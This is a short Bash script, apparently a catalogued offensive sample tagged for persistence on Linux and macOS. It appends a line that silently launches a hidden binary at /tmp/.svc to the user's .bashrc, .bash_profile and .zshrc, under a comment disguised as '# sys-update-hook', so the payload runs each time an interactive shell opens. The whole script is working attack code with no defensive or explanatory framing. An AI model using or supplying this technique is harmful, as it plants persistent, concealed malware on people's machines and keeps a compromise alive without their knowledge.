#!/usr/bin/env bash
# lang: Bash | file: persistence_bashrc.sh | target: Linux/macOS
# tag: persistence | shell: bash
# note: appends loader to ~/.bashrc and ~/.bash_profile — fires on interactive login

PAYLOAD="/tmp/.svc"
MARKER="# sys-update-hook"

inject() {
    local target="$1"
    if ! grep -q "$MARKER" "$target" 2>/dev/null; then
        echo "" >> "$target"
        echo "$MARKER" >> "$target"
        echo "nohup $PAYLOAD >/dev/null 2>&1 &" >> "$target"
        echo "[+] injected into $target"
    else
        echo "[~] already present in $target"
    fi
}

inject "$HOME/.bashrc"
inject "$HOME/.bash_profile"
inject "$HOME/.zshrc" 2>/dev/null

echo "[+] done. fires next interactive shell open."
